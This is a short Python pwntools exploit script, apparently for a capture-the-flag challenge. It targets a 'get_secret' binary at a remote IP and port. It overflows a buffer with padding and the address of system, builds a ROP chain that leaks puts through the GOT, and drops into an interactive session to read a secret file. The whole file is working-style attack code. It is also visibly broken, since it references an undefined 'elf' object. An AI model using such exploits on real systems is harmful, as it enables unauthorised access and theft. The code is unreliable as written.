from pwn import	*

from pprint import pprint

context.arch = 'amd64'

local = False
offset = 57


if local:
	p = process("./get_secret")
else:
	p = remote("167.99.243.7", 5003)

#print(elf)
#pprint(elf.symbols)

rop = ROP(p)
rop.call(elf.symbols["puts"], [elf.got['puts']])
rop.call(elf.symbols["system"])

print(p.recvuntil("\n"))

payload = [
	b"A"*offset,
	#b"/bin/cat secret.txt"
	p64(elf.symbols['system'])
	#rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

p.interactive()